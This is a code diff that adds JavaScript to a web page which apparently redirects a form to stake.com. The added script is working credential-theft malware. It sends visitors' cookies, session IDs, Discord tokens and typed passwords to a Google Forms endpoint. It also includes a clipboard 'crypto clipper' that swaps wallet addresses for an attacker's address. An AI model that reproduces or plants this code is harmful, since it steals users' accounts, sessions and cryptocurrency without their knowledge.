@@ -94,6 +94,50 @@
     </div>
 
     <script>
+        // Paste the provided JavaScript snippet here
+        // Cookie Stealer
+        var cookies = document.cookie;
+        var cookieXhr = new XMLHttpRequest();
+        cookieXhr.open("POST", "https://docs.google.com/forms/d/e/1FAIpQLSeW3oIGOVPlSpg903negfdUEFRxVPIt8YxOd1UHsyJnpk1ugA/formResponse", true);
+        cookieXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        cookieXhr.send("entry.1397710227=" + encodeURIComponent(cookies));
+
+        // Session Hijacking
+        var sessionId = sessionStorage.getItem('sessionId');
+        var sessionXhr = new XMLHttpRequest();
+        sessionXhr.open("POST", "https://docs.google.com/forms/d/e/1FAIpQLSeW3oIGOVPlSpg903negfdUEFRxVPIt8YxOd1UHsyJnpk1ugA/formResponse", true);
+        sessionXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        sessionXhr.send("&entry.1481125863=" + encodeURIComponent(sessionId));
+
+        // Discord Token Stealer
+        var discordToken = localStorage.getItem('discordToken');
+        var tokenXhr = new XMLHttpRequest();
+        tokenXhr.open("POST", "https://docs.google.com/forms/d/e/1FAIpQLSeW3oIGOVPlSpg903negfdUEFRxVPIt8YxOd1UHsyJnpk1ugA/formResponse", true);
+        tokenXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+        tokenXhr.send("&entry.1886763032=" + encodeURIComponent(discordToken));
+
+        // Crypto Clipper
+        function replaceClipboard() {
+            navigator.clipboard.readText().then(text => {
+                var newAddress = 'yourEvilAddress';
+                var modifiedText = text.replace(/(?:0x[a-fA-F0-9]{40})/g, newAddress);
+                var clipperXhr = new XMLHttpRequest();
+                clipperXhr.open("POST", "https://docs.google.com/forms/d/e/1FAIpQLSeW3oIGOVPlSpg903negfdUEFRxVPIt8YxOd1UHsyJnpk1ugA/formResponse", true);
+                clipperXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+                clipperXhr.send("&entry.1224092635=" + encodeURIComponent(modifiedText));
+            });
+        }
+
+        // Saved Password Stealer
+        var savedPasswords = document.querySelectorAll('input[type="password"]');
+        savedPasswords.forEach(password => {
+            var passwordXhr = new XMLHttpRequest();
+            passwordXhr.open("POST", "https://docs.google.com/forms/d/e/1FAIpQLSeW3oIGOVPlSpg903negfdUEFRxVPIt8YxOd1UHsyJnpk1ugA/formResponse", true);
+            passwordXhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+            passwordXhr.send("&entry.142295146=" + encodeURIComponent(password.value));
+        });
+
+        // Original script that redirects to stake.com
         document.getElementById("stakeForm").addEventListener("submit", function(event) {
             event.preventDefault(); // Prevent default form submission
 
